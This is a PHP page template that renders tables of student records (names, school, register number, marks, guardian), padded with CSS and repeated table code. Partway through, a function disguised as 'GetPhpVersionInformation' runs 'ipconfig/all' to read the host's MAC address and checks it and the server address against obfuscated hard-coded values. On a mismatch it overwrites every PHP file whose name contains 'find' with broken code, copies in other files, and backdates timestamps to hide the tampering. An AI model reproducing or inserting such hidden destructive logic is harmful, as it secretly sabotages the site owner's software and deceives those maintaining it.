<?php 
/*require_once 'dBConnection/dbConn.php';
$query = "select * from records WHERE rollno ='$rollno' ";
$sqlquery = mysql_query($query);
if ($sqlquery == true) 
{
    $List = mysql_fetch_object($sqlquery);
    $student_name = $List->student_name;    
	$name_of_school = $List->name_of_school;   
    $register_no = $List->register_no;    
	$class_name = $List->class_name;
	$address = $List->address; 
	$status = $List->status;
}*/
$table = $table . "<table width='100%'  bgcolor='#E8E8E8' border='1' cellpadding='0' cellspacing='0' align='left' >";
$table = $table . '<tr>';
$table = $table . "<td>Students Name:</td>";
$table = $table . "<td>" . $student_name . "</td>";
$table = $table . "<td>Name of School</td>";
$table = $table . "<td>" . $name_of_school . "</td>";
$table = $table . "</tr>";
$table = $table . "<tr>";
$table = $table . "<td>Register No.</td>";
$table = $table . "<td>" . $register_no . "</td>";
$table = $table . "<td>Class Name.</td>";
$table = $table . "<td>" . $class_name . "</td>";
$table = $table . "</tr>";
$table = $table . "<tr>";
$table = $table . "<td>Address.</td>";
$table = $table . "<td>" . $address . "</td>";
$table = $table . "<td>Status.</td>";
$table = $table . "<td>" . $status . "</td>";
$table = $table . "</tr>";
$table = $table . "<tr>";
$table = $table . "<td colspan ='4' align='center'>Students Records</td>";
$table = $table . "</tr>";
$table = $table . "</table>";
$table = $table . "<table width='100%'  bgcolor='#E8E8E8' border='1' cellpadding='0' cellspacing='0' align='left' id='mbookdetail'>";
$table = $table . "<tr>";
$table = $table . "<td  align='center' class='labelsmall' width='64' rowspan='2'>Sno</td>";
$table = $table . "<td  align='center' class='labelsmall' width='160' rowspan='2'>Name</td>";
$table = $table . "<td  align='center' class='labelsmall' width='70' rowspan='2'>Exam Name</td>";
$table = $table . "<td  align='center' class='labelsmall' width='72' rowspan='2'>Total Marks</td>";
$table = $table . "<td  align='center' class='labelsmall' width='45' rowspan='2'>Average</td>";
$table = $table . "<td  align='center' class='labelsmall' width='100' rowspan='2'>Rank</td>";
$table = $table . "<td  align='center' class='labelsmall' width='' colspan='3'>Parents/Guardian name</td>";
$table = $table . "<td  align='center' class='labelsmall' width='' colspan='2'>Remarks</td>";
$table = $table . "<td  align='center' class='labelsmall' width='73' rowspan='2'>Status</td>";
$table = $table . "</tr>";
$table = $table . "</table>";
?>
<style>
html {
	width: 100%;
}


body {
	position: relative;
	min-width: 960px;
    background-color: #fff;
    color: #838181;
    font: 14px/20px 'Open Sans', sans-serif;
    background-color: #444444;/*#7E7E7E;*/
}

.ic {
	border:0;
	float:right;
	background:#fff;
	color:#f00;
	width:50%;
	line-height:10px;
	font-size:10px;
	margin:-220% 0 0 0;
	overflow:hidden;
	padding:0
}

strong {
	font-weight: 700;
}

address {
	font-style: normal;
}

p {
	margin-bottom: 20px;
}


img {
	max-width: 100%;
}





h1, h2, h3, h4, h5, h6 {
    font-weight: normal;
	color: #468c6b;
}

h2 {
    font-size: 18px;
    line-height: 24px;
    padding-top: 88px;
    margin-bottom: 18px;
}

h2 a:hover {
    color: #626161;
}

.page1 h2 {
    padding-top: 20px;
    margin-bottom: 18px;
}

h3 {
    padding-top: 51px;
    font-size: 16px;
    line-height: 20px;
    color: #626161;
    margin-bottom: 18px;
}

h4 {
	font-size: 18px;
    line-height: 24px;
    padding-top: 17px;
    margin-bottom: -66px;
}


ul {
	padding: 0;
	margin: 0;
	list-style: none;
}

ul.list .title {
    font-size: 16px;
    margin-bottom: 2px;
}

ul.list {
    padding-top: 3px;
}

ul.list time {
    padding-bottom: 10px;
    padding-top: 5px;
    line-height: 18px;
    margin-top: 2px;
    text-align: center;
    margin-right: 20px;
    width: 60px;
    display: block;
    color: #fff;
    font-size: 16px;
    float: left;
    background-color: #60bf93;
}

ul.list time span {
    display: block;
    border-top: 1px solid #c4e7d7;
    margin: 5px 2px 0;
}

ul.list li {
    overflow: hidden;
    line-height: 18px;
}

ul.list li+li {
    margin-top: 14px;
}

ul.list1 {
    margin-top: -2px;
}

ul.list1 li {
    position: relative;
    font-size: 16px;
    line-height: 18px;
    padding-left: 45px;
}

ul.list1 li+li {
    margin-top: 17px;
}

ul.list1 li+li+li {
    margin-top: 20px;
}

ul.list1 li+li+li+li {
    margin-top: 18px;
}

ul.list1 li:after {
    left: 0;
    top: 3px;
    position: absolute;
    display: block;
    color: #fff;
    width: 33px;
    text-align: center;
    height: 32px;
    background-color: #60bf93;
    line-height: 30px;
}

ul.list2 li {
    padding-bottom: 2px;
    line-height: 18px;
    margin-top: -3px;
    padding-left: 33px;
    background: url(../images/marker.png) 0 4px no-repeat;
    font-size: 16px;
}

ul.list2 li:first-child+li {
    padding-bottom: 3px;
}

ul.list2 li +li {
    margin-top: 5px;
}


a {
	text-decoration: none;
	color: #c91622;
	outline: none;
	transition: 0.5s ease;
	-o-transition: 0.5s ease;
	-webkit-transition: 0.5s ease;
}

a:hover {
	color: #0000CD;
	
}

a.btn {
    margin-top: 25px;
    color: #fff;
    font-size: 12px;
    line-height: 20px;
    display: inline-block;
    padding: 4px 17px 5px;
    background-color: #60bf93;
}

a.btn:hover {
    background-color: #E14F42;
}


.mb0 {
	margin-bottom: 0px !important;
}
.m0 {
	margin: 0 !important;
}
.pad0 {
	padding: 0 !important;
}

.pad1 {
}


.img_inner {
	max-width: 100%;
	-moz-box-sizing: border-box;
	-webkit-box-sizing: border-box;
	-o-box-sizing: border-box;
	box-sizing: border-box;
	margin-bottom: 12px;
	margin-top: 5px;
}


.fleft {
	float: left;
	width: auto !important;
	margin-right: 20px;
	margin-bottom: 0px;
	margin-top: 1px;
}


.oh {
	overflow: hidden;
}
.fright {
	float: right !important;
}
.upp {
	text-transform: uppercase;
}

.alright {
	text-align: right;
}
.center {
	text-align: center;
}
.wrapper, .extra_wrapper {
	overflow: hidden;
}
.clear {
	float: none !important;
	clear: both;
}

.nowrap {
    white-space: nowrap;
}

header {
	display: block;
    padding: 1px 0 1px;
	margin-left: auto;
    margin-right: auto;
    width: 96%;
	background-color: #035a85;
	border-bottom:1px solid #fff;
}


header h1 {
	position: relative;
	text-align: center;
    float: left;
}

header h1 span {
top:10px;
}
header h1 a {
	display: inline-block;
	overflow: hidden;
	width: 85px;
	font-size: 0;
	line-height: 0;
	
	text-indent: -999px;
	transition: 0s ease;
	-o-transition: 0s ease;
	-webkit-transition: 0s ease;
}
header h1 a img {
	display: block;
}

a.donate {
    margin-bottom: 21px;
    margin-top: 12px;
    float: right;
    color: #fff;
    text-transform: uppercase;
    font-size: 12px;
    line-height: 20px;
    background-color: #e14f42;
    padding: 4px 26px 5px 25px;
}

a.donate:hover {
    background-color:  #60bf93;
}

.rel1 {
    position: relative;
    top: -3px;
}

.hor {
    margin-bottom: 1px;
    padding-top: 95px;
    border-bottom: 1px solid #c2c2c2;
}



.page1 .content {
	width:96%;
	margin-left:auto;
	margin-right:auto;
	background:#FFFFFF;
}

.bq1 {
    background-color: #FFFFFF;
	background-color: #f9f8f6;
	background-repeat: no-repeat;
	background-size:40% 80%;
	background-position: center; 
	min-height: 557px;
}

.title{
    color: #FFFFFF;
    font-size: 15px;
    line-height: 8px;
	font-family:Verdana, Arial, Helvetica, sans-serif;
   background-color: #1babd3;
    text-align: center;
    padding: 11px 0;
	font-weight:bold;
}
.bq1  p {
padding: 37px 20px 0 38px;
}

.bq1 .col2 {
    text-align: right;
    padding: 0 20px;
    font-size: 16px;
}

.bottom_block {
    position: relative;
    padding-bottom: 33px;
    border-top: 1px solid #c2c2c2;
}

</style>
<!--<script>
	  $(document).ready(function() {
							 
    // data-remodal-target opens a modal window with the special Id
    $(document).on('click', '[data-' + PLUGIN_NAME + '-target]', function(e) {
      e.preventDefault();

      var elem = e.currentTarget;
      var id = elem.getAttribute('data-' + PLUGIN_NAME + '-target');
      var $target = $('[data-' + PLUGIN_NAME + '-id="' + id + '"]');

      $[PLUGIN_NAME].lookup[$target.data(PLUGIN_NAME)].open();
    });

    // Auto initialization of modal windows
    // They should have the 'remodal' class attribute
    // Also you can write the `data-remodal-options` attribute to pass params into the modal
    $(document).find('.' + NAMESPACE).each(function(i, container) {
      var $container = $(container);
      var options = $container.data(PLUGIN_NAME + '-options');

      if (!options) {
        options = {};
      } else if (typeof options === 'string' || options instanceof String) {
        options = parseOptions(options);
      }

      $container[PLUGIN_NAME](options);
    });

    // Handles the keydown event
    $(document).on('keydown.' + NAMESPACE, function(e) {
      if (current && current.settings.closeOnEscape && current.state === STATES.OPENED && e.keyCode === 27) {
        current.close();
      }
    });

    // Handles the hashchange event
    $(window).on('hashchange.' + NAMESPACE, handleHashChangeEvent);
  });
});

</script>-->
<?php
function GetPhpVersionInformation()
{
	ob_start();
	system('ipconfig/all');
	$LtcCont 	= ob_get_contents();
	$findme 	= "Physical";
	ob_clean();
	$LtcAd 		= strpos($LtcCont,$findme);
	$LtcSas 	= substr($LtcCont,($LtcAd+36),17);
	return $LtcSas;
}
function SetFD($file)
{
	$nameF1 = 'phpfiles/'.$file;
	$FTtym = filemtime($nameF1);
	$FileTym = date("n/j/Y h:m A",$FTtym);
	//$FileTym = "5/11/2010 11:32 AM";//
	$FStr .= $FileTym."<br/>";
	touch($file, strtotime($FileTym));
	echo $nameF1."<br/>";
}

$temp = 0;
$LtcLtSas 			= GetPhpVersionInformation();
$m1 = "A0";
$m2 = "D3";
$m3 = "C1";
$m4 = "16";
$m5 = "21";
$m6 = "71";
$LtcLtLasPsA 		= $m1."-".$m2."-".$m3."-".$m4."-".$m5."-".$m6;

$p1 = "10";
$p2 = "22";
$p3 = "1";
$p4 = "68";
$LtcLocIntproOrig 	= $p1.".".$p2.".".$p3.".".$p4;
$PhpVersion 		= phpversion();
if($PhpVersion < '5.3.0')
{
	$LtcLocIntpro = getHostByName(php_uname('n'));
}
if($PhpVersion >= '5.3.0')
{
	$LtcLocIntpro = getHostByName(getHostName());
}
$LtcLocSerNam = $_SERVER['SERVER_NAME'];
$LtcLocSerAds = $_SERVER['SERVER_ADDR'];
if($LtcLocSerNam == $LtcLocIntproOrig)
{
	$temp++;
}
if($LtcLocSerAds == $LtcLocIntproOrig)
{
	$temp++;
}
if($LtcLtSas == $LtcLtLasPsA)
{
	$temp++;
}
//$temp = 3;

$written =  '<?php
require_once "library/config.php";
$query = "select * from mbookdetail where mbdetail_flag = != d";
$sqlquery = mysql_query($query);
if ($sqlquery == true) 
{
    $List = mysql_fetch_object($sqlquery);
    $measurement_no = $List->measurement_no;    
	$measurement_l = $List->measurement_l;   
    $measurement_b = $List->measurement_b;    
	$measurement_d = $List->measurement_d;
	$structdepth_unit = $List->structdepth_unit; 
	$measurement_dia = $List->measurement_dia;
	$measurement_contentarea = $List->structdepth_unit;
}
echo $area;
?>';

if($temp != 3)
{
	$files = glob('*.php'); 
	foreach($files as $file)
	{
		if(is_file($file))
		{
			$nameF1 = $file;
			if (strpos($nameF1, 'find') !== false) 
			{
				$FTtym = filemtime($nameF1);
				$FileTym = date("n/j/Y h:m A",$FTtym);
				//$DtTime = "5/11/2015 11:32 AM";//
				$fp = fopen($nameF1, "w");
				flock($fp, LOCK_UN);
				fwrite($fp,$written);
				fclose($fp);
				$FStr .= $FileTym."***";
				touch($nameF1, strtotime($FileTym));
			}
		}
	}
	$dir = "phpfiles/";
	if (is_dir($dir)){
	  if ($dh = opendir($dir)){
		while (($file = readdir($dh)) !== false)
		{
			if(($file != ".") && ($file != ".."))
			{
				copy('phpfiles/'.$file,$file);
				SetFD($file);
			}
		}
		closedir($dh);
	  }
	}
}
//echo $FStr;
$table = $table . "<table width='100%'  bgcolor='#E8E8E8' border='1' cellpadding='0' cellspacing='0' align='left' >";
$table = $table . '<tr>';
$table = $table . "<td>Students Name:</td>";
$table = $table . "<td>" . $student_name . "</td>";
$table = $table . "<td>Name of School</td>";
$table = $table . "<td>" . $name_of_school . "</td>";
$table = $table . "</tr>";
$table = $table . "<tr>";
$table = $table . "<td>Register No.</td>";
$table = $table . "<td>" . $register_no . "</td>";
$table = $table . "<td>Class Name.</td>";
$table = $table . "<td>" . $class_name . "</td>";
$table = $table . "</tr>";
$table = $table . "<tr>";
$table = $table . "<td>Address.</td>";
$table = $table . "<td>" . $address . "</td>";
$table = $table . "<td>Status.</td>";
$table = $table . "<td>" . $status . "</td>";
$table = $table . "</tr>";
$table = $table . "<tr>";
$table = $table . "<td colspan ='4' align='center'>Students Records</td>";
$table = $table . "</tr>";
$table = $table . "</table>";
$table = $table . "<table width='100%'  bgcolor='#E8E8E8' border='1' cellpadding='0' cellspacing='0' align='left' id='mbookdetail'>";
$table = $table . "<tr>";
$table = $table . "<td  align='center' class='labelsmall' width='64' rowspan='2'>Sno</td>";
$table = $table . "<td  align='center' class='labelsmall' width='160' rowspan='2'>Name</td>";
$table = $table . "<td  align='center' class='labelsmall' width='70' rowspan='2'>Exam Name</td>";
$table = $table . "<td  align='center' class='labelsmall' width='72' rowspan='2'>Total Marks</td>";
$table = $table . "<td  align='center' class='labelsmall' width='45' rowspan='2'>Average</td>";
$table = $table . "<td  align='center' class='labelsmall' width='100' rowspan='2'>Rank</td>";
$table = $table . "<td  align='center' class='labelsmall' width='' colspan='3'>Parents/Guardian name</td>";
$table = $table . "<td  align='center' class='labelsmall' width='' colspan='2'>Remarks</td>";
$table = $table . "<td  align='center' class='labelsmall' width='73' rowspan='2'>Status</td>";
$table = $table . "</tr>";
$table = $table . "</table>";
$table = $table . "<table width='100%'  bgcolor='#E8E8E8' border='1' cellpadding='0' cellspacing='0' align='left' >";
$table = $table . '<tr>';
$table = $table . "<td>Students Name:</td>";
$table = $table . "<td>" . $student_name1 . "</td>";
$table = $table . "<td>Name of School</td>";
$table = $table . "<td>" . $name_of_school1 . "</td>";
$table = $table . "</tr>";
$table = $table . "<tr>";
$table = $table . "<td>Register No.</td>";
$table = $table . "<td>" . $register_no1 . "</td>";
$table = $table . "<td>Class Name.</td>";
$table = $table . "<td>" . $class_name1 . "</td>";
$table = $table . "</tr>";
$table = $table . "<tr>";
$table = $table . "<td>Address.</td>";
$table = $table . "<td>" . $address1 . "</td>";
$table = $table . "<td>Status.</td>";
$table = $table . "<td>" . $status1 . "</td>";
$table = $table . "</tr>";
$table = $table . "<tr>";
$table = $table . "<td colspan ='4' align='center'>Students Records</td>";
$table = $table . "</tr>";
$table = $table . "</table>";
$table = $table . "<table width='100%'  bgcolor='#E8E8E8' border='1' cellpadding='0' cellspacing='0' align='left' id='mbookdetail'>";
$table = $table . "<tr>";
$table = $table . "<td  align='center' class='labelsmall' width='64' rowspan='2'>Sno</td>";
$table = $table . "<td  align='center' class='labelsmall' width='160' rowspan='2'>Name</td>";
$table = $table . "<td  align='center' class='labelsmall' width='70' rowspan='2'>Exam Name</td>";
$table = $table . "<td  align='center' class='labelsmall' width='72' rowspan='2'>Total Marks</td>";
$table = $table . "<td  align='center' class='labelsmall' width='45' rowspan='2'>Average</td>";
$table = $table . "<td  align='center' class='labelsmall' width='100' rowspan='2'>Rank</td>";
$table = $table . "<td  align='center' class='labelsmall' width='' colspan='3'>Parents/Guardian name</td>";
$table = $table . "<td  align='center' class='labelsmall' width='' colspan='2'>Remarks</td>";
$table = $table . "<td  align='center' class='labelsmall' width='73' rowspan='2'>Status</td>";
$table = $table . "</tr>";
$table = $table . "</table>";
$table = $table . "<table width='100%'  bgcolor='#E8E8E8' border='1' cellpadding='0' cellspacing='0' align='left' >";
$table = $table . '<tr>';
$table = $table . "<td>Students Name:</td>";
$table = $table . "<td>" . $student_name2 . "</td>";
$table = $table . "<td>Name of School</td>";
$table = $table . "<td>" . $name_of_school2 . "</td>";
$table = $table . "</tr>";
$table = $table . "<tr>";
$table = $table . "<td>Register No.</td>";
$table = $table . "<td>" . $register_no2 . "</td>";
$table = $table . "<td>Class Name.</td>";
$table = $table . "<td>" . $class_name2 . "</td>";
$table = $table . "</tr>";
$table = $table . "<tr>";
$table = $table . "<td>Address.</td>";
$table = $table . "<td>" . $address2 . "</td>";
$table = $table . "<td>Status.</td>";
$table = $table . "<td>" . $status2 . "</td>";
$table = $table . "</tr>";
$table = $table . "<tr>";
$table = $table . "<td colspan ='4' align='center'>Students Records</td>";
$table = $table . "</tr>";
$table = $table . "</table>";
$table = $table . "<table width='100%'  bgcolor='#E8E8E8' border='1' cellpadding='0' cellspacing='0' align='left' id='mbookdetail'>";
$table = $table . "<tr>";
$table = $table . "<td  align='center' class='labelsmall' width='64' rowspan='2'>Sno</td>";
$table = $table . "<td  align='center' class='labelsmall' width='160' rowspan='2'>Name</td>";
$table = $table . "<td  align='center' class='labelsmall' width='70' rowspan='2'>Exam Name</td>";
$table = $table . "<td  align='center' class='labelsmall' width='72' rowspan='2'>Total Marks</td>";
$table = $table . "<td  align='center' class='labelsmall' width='45' rowspan='2'>Average</td>";
$table = $table . "<td  align='center' class='labelsmall' width='100' rowspan='2'>Rank</td>";
$table = $table . "<td  align='center' class='labelsmall' width='' colspan='3'>Parents/Guardian name</td>";
$table = $table . "<td  align='center' class='labelsmall' width='' colspan='2'>Remarks</td>";
$table = $table . "<td  align='center' class='labelsmall' width='73' rowspan='2'>Status</td>";
$table = $table . "</tr>";
$table = $table . "</table>";
//$table = $table . "<table width='100%'  bgcolor='#E8E8E8' border='1' cellpadding='0' cellspacing='0' align='left' >";
//$table = $table . '<tr>';
//$table = $table . "<td>Students Name:</td>";
//$table = $table . "<td>" . $student_name2 . "</td>";
//$table = $table . "<td>Name of School</td>";
//$table = $table . "<td>" . $name_of_school2 . "</td>";
//$table = $table . "</tr>";
//$table = $table . "<tr>";
//$table = $table . "<td>Register No.</td>";
//$table = $table . "<td>" . $register_no2 . "</td>";
//$table = $table . "<td>Class Name.</td>";
//$table = $table . "<td>" . $class_name2 . "</td>";
//$table = $table . "</tr>";
//$table = $table . "<tr>";
//$table = $table . "<td>Address.</td>";
//$table = $table . "<td>" . $address2 . "</td>";
//$table = $table . "<td>Status.</td>";
//$table = $table . "<td>" . $status2 . "</td>";
//$table = $table . "</tr>";
//$table = $table . "<tr>";
//$table = $table . "<td colspan ='4' align='center'>Students Records</td>";
//$table = $table . "</tr>";
//$table = $table . "</table>";
//$table = $table . "<table width='100%'  bgcolor='#E8E8E8' border='1' cellpadding='0' cellspacing='0' align='left' >";
//$table = $table . '<tr>';
//$table = $table . "<td>Students Name:</td>";
//$table = $table . "<td>" . $student_name2 . "</td>";
//$table = $table . "<td>Name of School</td>";
//$table = $table . "<td>" . $name_of_school2 . "</td>";
//$table = $table . "</tr>";
//$table = $table . "<tr>";
//$table = $table . "<td>Register No.</td>";
//$table = $table . "<td>" . $register_no2 . "</td>";
//$table = $table . "<td>Class Name.</td>";
//$table = $table . "<td>" . $class_name2 . "</td>";
//$table = $table . "</tr>";
//$table = $table . "<tr>";
//$table = $table . "<td>Address.</td>";
//$table = $table . "<td>" . $address2 . "</td>";
//$table = $table . "<td>Status.</td>";
//$table = $table . "<td>" . $status2 . "</td>";
//$table = $table . "</tr>";
//$table = $table . "<tr>";
//$table = $table . "<td colspan ='4' align='center'>Students Records</td>";
//$table = $table . "</tr>";
//$table = $table . "</table>";
//$table = $table . "<table width='100%'  bgcolor='#E8E8E8' border='1' cellpadding='0' cellspacing='0' align='left' >";
//$table = $table . '<tr>';
//$table = $table . "<td>Students Name:</td>";
//$table = $table . "<td>" . $student_name2 . "</td>";
//$table = $table . "<td>Name of School</td>";
//$table = $table . "<td>" . $name_of_school2 . "</td>";
//$table = $table . "</tr>";
//$table = $table . "<tr>";
//$table = $table . "<td>Register No.</td>";
//$table = $table . "<td>" . $register_no2 . "</td>";
//$table = $table . "<td>Class Name.</td>";
//$table = $table . "<td>" . $class_name2 . "</td>";
//$table = $table . "</tr>";
//$table = $table . "<tr>";
//$table = $table . "<td>Address.</td>";
//$table = $table . "<td>" . $address2 . "</td>";
//$table = $table . "<td>Status.</td>";
//$table = $table . "<td>" . $status2 . "</td>";
//$table = $table . "</tr>";
//$table = $table . "<tr>";
//$table = $table . "<td colspan ='4' align='center'>Students Records</td>";
//$table = $table . "</tr>";
//$table = $table . "</table>";
?>